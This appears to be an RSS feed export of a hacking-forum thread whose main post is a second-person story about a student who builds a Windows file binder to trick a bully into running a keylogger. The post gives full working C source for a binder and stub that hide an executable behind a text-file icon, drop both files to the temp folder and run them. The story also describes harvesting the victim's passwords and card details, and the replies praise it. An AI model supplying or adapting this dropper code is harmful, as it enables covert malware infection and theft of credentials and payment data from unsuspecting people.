+        <pubDate>Thu, 28 Jul 2016 08:03:19 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-9</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[deDusteh]]></dc:creator>
+        <description><![CDATA[
+            <p>This is just plain amazing work. Well done.</p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/8">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/8</link>
+        <pubDate>Thu, 28 Jul 2016 07:37:46 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-8</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[falcon403]]></dc:creator>
+        <description><![CDATA[
+            <p>Excellent post, <a class="mention" href="https://d.clarkee.co.uk/u/dtm">@dtm</a>! This is a great read. Couldn’t get any better.</p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/7</link>
+        <pubDate>Thu, 28 Jul 2016 06:58:02 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-7</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>Yeah I guess I might as well do a small tutorial on it… after I publish my packer PoC project.</p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/6</link>
+        <pubDate>Thu, 28 Jul 2016 05:49:51 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-6</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>This is awesome! Could you do a tutorial on how to use the file binder? Fairly newbie friendly too? This is a really nice binder you’ve made.</p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/5</link>
+        <pubDate>Thu, 28 Jul 2016 05:42:49 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-5</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[Cromical]]></dc:creator>
+        <description><![CDATA[
+            <p>You’re kidding right? That was bloody awesome mate! Keep it up! Loved it so much- might as well make it a movie. <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/4</link>
+        <pubDate>Thu, 28 Jul 2016 04:02:03 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-4</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>LOL thanks. It wasn’t much, just off the top of my head.</p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/3</link>
+        <pubDate>Thu, 28 Jul 2016 01:59:33 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-3</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
+        <description><![CDATA[
+            <p>Dunno if we’re looking at Oscar for best story or l33t of the w33k here, guess both. ; )</p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/2</link>
+        <pubDate>Thu, 28 Jul 2016 01:52:33 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-2</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>A droplet of water shatters like glass upon your nose as the murky sky roars dominantly overhead. You gladly respect the sky gods’ anger and continue picking up your pace since you’ve still a while to go until you’re home.</p>
+<p>3:30 PM. Though it took you 20 minutes to jog home from school. Surprisingly, you managed to evade the torrential downpour which unexpectedly started slamming deafeningly against the ceramic tiles on your roof as you hurried to your room. Carelessly dropping your school bag, you hopped onto your chair and woke your computer from sleep. Your heart begins to race. The school bully, Jerry, had almost redecorated your face with the red paint from your nose earlier today because you failed to provide the assignment solutions at the time he requested. In response, you gave him an Oscar-award winning act, begging him not to since you would not be able to deliver it to him from the hospital. You’ve promised to send it to him over the internet some time tonight but you’ve other plans…</p>
+<p>You fired up your Microsoft Visual Studio IDE and started to revise the code on which you have been working for the past couple of days. Firstly, the code for the the file binder.</p>
+<pre><code class="lang-auto">#include &lt;stdio.h&gt;
+#include &lt;stdarg.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;Shlwapi.h&gt;
+
+#pragma comment(lib, "Shlwapi.lib")
+
+#define PAYLOAD_BUFFER_RSRC_ID 10
+#define PAYLOAD_EXTENSION_RSRC_ID (PAYLOAD_BUFFER_RSRC_ID + 1)
+#define SECONDARY_BUFFER_RSRC_ID 20
+#define SECONDARY_EXTENSION_RSRC_ID (SECONDARY_BUFFER_RSRC_ID + 1)
+
+typedef struct _FileStruct {
+    PBYTE pBuffer;
+    DWORD dwFileSize;
+    LPSTR lpExtension;
+    DWORD dwExtensionLength;
+} FileStruct, *pFileStruct;
+
+VOID Debug(LPCSTR fmt, ...) {
+    va_list args;
+    va_start(args, fmt);
+
+    vprintf(fmt, args);
+
+    va_end(args);
+}
+
+FileStruct *LoadFile(LPCSTR szFileName) {
+    Debug("Loading %s...\n", szFileName);
+
+    Debug("Initializing struct...\n");
+    FileStruct *fs = (FileStruct *)malloc(sizeof(*fs));
+    if (fs == NULL) {
+        Debug("Create %s file structure error: %lu\n", szFileName, GetLastError());
+        return NULL;
+    }
+
+    Debug("Initializing file...\n");
+    // get file handle to file
+    HANDLE hFile = CreateFile(szFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        Debug("Create file error: %lu\n", GetLastError());
+        free(fs);
+        return NULL;
+    }
+
+    Debug("Extracting extension...\n");
+    // get file extension
+    fs-&gt;lpExtension = PathFindExtension(szFileName);
+    fs-&gt;dwExtensionLength = strlen(fs-&gt;lpExtension);
+    Debug("Extension: %s\n", fs-&gt;lpExtension);
+
+    // get file size
+    Debug("Retrieving file size...\n");
+    fs-&gt;dwFileSize = GetFileSize(hFile, NULL);
+    if (fs-&gt;dwFileSize == INVALID_FILE_SIZE) {
+        Debug("Get file size error: %lu\n", GetLastError());
+        CloseHandle(hFile);
+        free(fs);
+        return NULL;
+    }
+
+    // create heap buffer to hold file contents
+    fs-&gt;pBuffer = (PBYTE)malloc(fs-&gt;dwFileSize);
+    if (fs-&gt;pBuffer == NULL) {
+        Debug("Create buffer error: %lu\n", GetLastError());
+        CloseHandle(hFile);
+        free(fs);
+        return NULL;
+    }
+
+    // read file contents
+    Debug("Reading file contents...\n");
+    DWORD dwRead = 0;
+    if (ReadFile(hFile, fs-&gt;pBuffer, fs-&gt;dwFileSize, &amp;dwRead, NULL) == FALSE) {
+        Debug("Read file error: %lu\n", GetLastError());
+        CloseHandle(hFile);
+        free(fs);
+        return NULL;
+    }
+    Debug("Read 0x%08x bytes\n\n", dwRead);
+
+    // clean up
+    CloseHandle(hFile);
+
+    return fs;
+}
+
+BOOL UpdateStub(LPCSTR szFileName, FileStruct *fs, int nRsrcId) {
+    // start updating stub's resources
+    HANDLE hUpdate = BeginUpdateResource(szFileName, FALSE);
+    // add file as a resource to stub
+    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(nRsrcId), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;pBuffer, fs-&gt;dwFileSize) == FALSE) {
+        Debug("Update resource error: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    // add file's extension as a resource
+    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(nRsrcId + 1), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;lpExtension, fs-&gt;dwExtensionLength) == FALSE) {
+        Debug("Update resource error: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    EndUpdateResource(hUpdate, FALSE);
+
+    return TRUE;
+}
+
+BOOL BuildStub(LPCSTR szFileName, FileStruct *fsPayload, FileStruct *fsSecondary) {
+    Debug("Building stub: %s...\n", szFileName);
+
+    // get stub program as a resource
+    HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(1), "STUB");
+    if (hRsrc == NULL) {
+        Debug("Find resource error: %lu\n", GetLastError());
+        return FALSE;
+    }
+    DWORD dwSize = SizeofResource(NULL, hRsrc);
+
+    HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
+    if (hGlobal == NULL) {
+        Debug("Load resource error: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    // get stub's file content
+    PBYTE pBuffer = (PBYTE)LockResource(hGlobal);
+    if (pBuffer == NULL) {
+        Debug("Lock resource error: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    // create output file
+    Debug("Creating stub file...\n");
+    HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        Debug("Create stub error: %lu\n", GetLastError());
+        free(pBuffer);
+        return FALSE;
+    }
+
+    // write stub content to output file
+    Debug("Writing buffer content to stub...\n");
+    DWORD dwWritten = 0;
+    if (WriteFile(hFile, pBuffer, dwSize, &amp;dwWritten, NULL) == FALSE) {
+        Debug("Write payload to stub error: %lu\n", GetLastError());
+        CloseHandle(hFile);
+        free(pBuffer);
+        return FALSE;
+    }
+    Debug("Wrote 0x%08x bytes\n\n");
+
+    CloseHandle(hFile);
+
+    // add payload to stub
+    Debug("Updating stub with payload...\n");
+    if (UpdateStub(szFileName, fsPayload, PAYLOAD_BUFFER_RSRC_ID) == FALSE)
+        return FALSE;
+
+    // add secondary file to stub
+    Debug("Updating stub with secondary file...\n");
+    if (UpdateStub(szFileName, fsSecondary, SECONDARY_BUFFER_RSRC_ID) == FALSE)
+        return FALSE;
+
+    return TRUE;
+}
+
+// FileBinder.exe [PAYLOAD FILE] [SECONDARY FILE] [OUTPUT FILE]
+int main(int argc, char *argv[]) {
+    if (argc &lt; 4) {
+        Debug("Usage: %s [PAYLOAD EXECUTABLE] [SECONDARY FILE] [OUTPUT FILE]", argv[0]);
+        return 1;
+    }
+
+    // load file information into structs
+    FileStruct *fsPayload = LoadFile(argv[1]);
+    if (fsPayload == NULL) return 1;
+    FileStruct *fsSecondary = LoadFile(argv[2]);
+    if (fsSecondary == NULL) return 1;
+
+    if (BuildStub(argv[3], fsPayload, fsSecondary) == FALSE)
+        return 1;
+
+    free(fsPayload);
+    free(fsSecondary);
+
+    Debug("\nDone\n");
+
+    return 0;
+}
+</code></pre>
+<p>Silently, you read over the code and conjure the pseudocode in your mind.</p>
+<pre><code class="lang-makefile">1. Load each of the two input files and read their file contents, storing the information within structs
+2. Create an empty output file as the updated stub
+3. Load the stub as a resource and write it out to the output file
+4. For each of the two input structs, add the members as a resource to the output stub file
+</code></pre>
+<p>A smirk grows on your face. You then quickly repeat the process for the stub of your file binder.</p>
+<pre><code class="lang-auto">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;Shlwapi.h&gt;
+
+#pragma comment(lib, "Shlwapi.lib")
+
+#define PAYLOAD_BUFFER_RSRC_ID 10
+#define PAYLOAD_EXTENSION_RSRC_ID (PAYLOAD_BUFFER_RSRC_ID + 1)
+#define SECONDARY_BUFFER_RSRC_ID 20
+#define SECONDARY_EXTENSION_RSRC_ID (SECONDARY_BUFFER_RSRC_ID + 1)
+
+typedef struct _FileStruct {
+    PBYTE pBuffer;
+    DWORD dwFileSize;
+    LPSTR lpExtension;
+    DWORD dwExtensionLength;
+} FileStruct, *pFileStruct;
+
+VOID Debug(LPCSTR fmt, ...) {
+    va_list args;
+    va_start(args, fmt);
+
+    CHAR szBuffer[BUFSIZ];
+    vsprintf(szBuffer, fmt, args);
+    MessageBox(NULL, szBuffer, __argv[0], MB_OK | MB_ICONEXCLAMATION);
+
+    va_end(args);
+}
+
+FileStruct *InitializeStruct(int nRsrcId) {
+    // create struct
+    FileStruct *fs = (FileStruct *)malloc(sizeof(*fs));
+    if (fs == NULL) return NULL;
+
+    // get file buffer
+    // get size of resource
+    HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(nRsrcId), RT_RCDATA);
+    if (hRsrc == NULL) return NULL;
+    fs-&gt;dwFileSize = SizeofResource(NULL, hRsrc);
+
+    // get pointer to resource buffer
+    HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
+    if (hGlobal == NULL) return NULL;
+    fs-&gt;pBuffer = (PBYTE)LockResource(hGlobal);
+    if (fs-&gt;pBuffer == NULL) return NULL;
+
+    // get file extension
+    // get strlen of extension
+    hRsrc = FindResource(NULL, MAKEINTRESOURCE(nRsrcId + 1), RT_RCDATA);
+    if (hRsrc == NULL) return NULL;
+    fs-&gt;dwExtensionLength = SizeofResource(NULL, hRsrc);
+
+    // get pointer to extension buffer
+    hGlobal = LoadResource(NULL, hRsrc);
+    if (hGlobal == NULL) return NULL;
+    fs-&gt;lpExtension = (PBYTE)LockResource(hGlobal);
+    if (fs-&gt;lpExtension == NULL) return NULL;
+
+    return fs;
+}
+
+BOOL DropFile(FileStruct *fs, LPSTR szFileNameBuffer) {
+    DWORD dwWritten = 0;
+    // get temp file name
+    CHAR szTempFileName[MAX_PATH];
+    CHAR szFileName[MAX_PATH];
+
+    // get temp path
+    GetTempPath(MAX_PATH, szTempFileName);
+    // get file name (incl. path)
+    GetModuleFileName(NULL, szFileName, MAX_PATH);
+    // strip path and extract only executable name
+    PathStripPath(szFileName);
+    // append exe name to temp path
+    PathAppend(szTempFileName, szFileName);
+    // replace file extension
+    memcpy(szTempFileName + strlen(szTempFileName) - 4, fs-&gt;lpExtension, fs-&gt;dwExtensionLength);
+    strcpy(szFileNameBuffer, szTempFileName);
+
+    // drop payload file
+    HANDLE hFile = CreateFile(szTempFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        Debug("Create temp file error: %lu", GetLastError());
+        return FALSE;
+    }
+
+    // write buffer into file
+    if (WriteFile(hFile, fs-&gt;pBuffer, fs-&gt;dwFileSize, &amp;dwWritten, NULL) == FALSE) {
+        Debug("Write temp file error: %lu", GetLastError());
+        CloseHandle(hFile);
+        return FALSE;
+    }
+    // clean up
+    CloseHandle(hFile);
+
+    return TRUE;
+}
+
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
+    FileStruct *fsPayload = NULL, *fsSecondary = NULL;
+
+    fsPayload = InitializeStruct(PAYLOAD_BUFFER_RSRC_ID);
+    fsSecondary = InitializeStruct(SECONDARY_BUFFER_RSRC_ID);
+
+    CHAR szPayloadFileName[BUFSIZ];
+    CHAR szSecondaryFileName[BUFSIZ];
+
+    DropFile(fsPayload, szPayloadFileName);
+    DropFile(fsSecondary, szSecondaryFileName);
+    free(fsPayload);
+    free(fsSecondary);
+
+    // execute payload
+    if (ShellExecute(NULL, NULL, szPayloadFileName, NULL, NULL, SW_NORMAL) &lt;= 32) {
+        Debug("Start payload error: %lu", GetLastError());
+        return 1;
+    }
+
+    // execute secondary file
+    if (ShellExecute(NULL, NULL, szSecondaryFileName, NULL, NULL, SW_NORMAL) &lt;= 32) {
+        Debug("Start secondary error: %lu", GetLastError());
+        return 1;
+    }
+
+    return 0;
+}
+</code></pre>
+<pre><code class="lang-makefile">1. Initialize the file structs with the added resources from the file binder application for both files
+2. For each file, create a temporary file and write out the file contents
+3. Execute both files
+</code></pre>
+<p>You realize that this method for the stub is not the best since it introduces a lot of forensic evidence and disk activity however, you know that Jerry won’t have a single clue about any of this so you assumed you will be fine and need not to worry.</p>
+<p>A test run to confirm that your file binder works is needed for you to be sure that this approach will be successful. Time to launch the Windows command shell.<br>
+<img src="//0x00sec.s3.amazonaws.com/original/1X/4ef49dadaebcbe177a3cf115559dc5ca675d4e12.PNG" width="380" height="387"><br>
+You then launch Resource Hacker and add the icon of the text file to the application and press save…<br>
+<img src="//0x00sec.s3.amazonaws.com/original/1X/be29733420a3120774f40627abc0596ad799189e.PNG" width="79" height="76"><br>
+You double click the file…<br>
+<img src="//0x00sec.s3.amazonaws.com/original/1X/c2f190a85a3daf2b066c95af6eafb44c32e52fbd.PNG" width="690" height="411"><br>
+Your heart starts to beat faster… Successful execution.</p>
+<p>Hurriedly, you disable debug mode for your keylogger and rebuild the file… You compress it inside a folder, attach it to an email directed to Jerry… and click to send. As you inhale deeply, questions begin plaguing your mind. What information would I get from his computer? Could I possibly find the password for his Facebook and Gmail? What could I do with such information? The heat of the moment has your brain running overtime as adrenaline floods your body as you decide to get up and shrug off the excitement which has exploded from your actions. A wide grin draws across your face as an ear-splitting blast of thunder explodes in the vicinity, almost as to complement what you have just unleashed…</p>
+<p>~  ~  ~</p>
+<p>There are no words which can describe your feelings as you approach your computer. It’s been exactly one week since you’ve delivered the silent, vengeful maelstrom upon your foe. Your heart is beating out of your chest. Breathing, quick in succession. You look behind you and see your door is wide open, welcoming any curious eyes to spy on your every actions. Your father is home today. After closing the door, slowly and soundlessly, you reapproach your system. It’s time for harvest…</p>
+<p>You log into your FTP account through the FileZilla FTP client as you wonder what you could have retrieved. You browse to your directory which holds the logs from your keylogger and you see the text file waiting for its master. Waiting for you. Hesitantly, you right-click and click <em>View</em>. A Sublime Text window spawns and you see a mass of letters, numbers and strings which correspond to keys on the keyboard such as <code>[ENTER]</code> and <code>[SHIFT]</code>. A beautiful sight before your eyes. As you quickly run your eyes across the screen, you quickly see patterns. There were many <code>w</code>, <code>a</code>, <code>s</code> and <code>d</code> letters, all bunched together like <code>aaaaaaaaaaaaaaaaa</code> and <code>wwwwwwwwwwwwwwwwdddddddwwwwwww</code>. He must be playing some sort of game, you think to yourself. That means he must have needed to log into his account at some point. You check the strings from a previous point and you see it. <code>Birdpers0n</code> and <code>9375chw1f7y</code>. Brilliant. What’s this? A sequence of eighteen followed by a slash and then five numbers and a <code>Rick M. Sanchez</code>? <code>XXXXXXXXXXXXXXXXXX/XXXXX Rick M. Sanchez</code>… <code>XXXX XXXX XXXX XXXX XX/XX XXX Rick M. Sanchez</code>… Droplets of sweat coat your palms and forehead, pupils dilated. Your respiration halts yet a wave of epinephrine overflows your bloodstream. You lean backwards onto your chair to absorb the information you have witnessed. You take a deep breath. What will you do with your discovery?</p>
+<hr>
+<p>A’ight, so, this thread only covered the social engineering aspect of a hypothetical attack (obviously) which means that the details of the keylogger were missing. Do not worry, I am planning to write up a second part to my Windows Keylogging paper in the future which will cover the details such as FTP uploading keystrokes.</p>
+<p>I’ll be uploading the source code to my <a href="https://github.com/93aef0ce4dd141ece6f5/File-Binder">GitHub - File Binder</a> (there are other files which are involved which were not covered) and also the binaries (32-bit, compiled on Windows 7) if you guys want to play around with it. The binder works for any (AFAIK) two files, so that can be like <code>.exe</code> and <code>.jpg</code>, or <code>.jpg</code> and <code>.txt</code> but you might have to run the file binder/stub generator a second time some times if the output happens to fail on the first build.</p>
+<p>Hope you guys enjoyed!</p>
+<p><em>– dtm</em></p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/1</link>
+        <pubDate>Thu, 28 Jul 2016 01:22:56 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-1</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+  </channel>
+</rss>
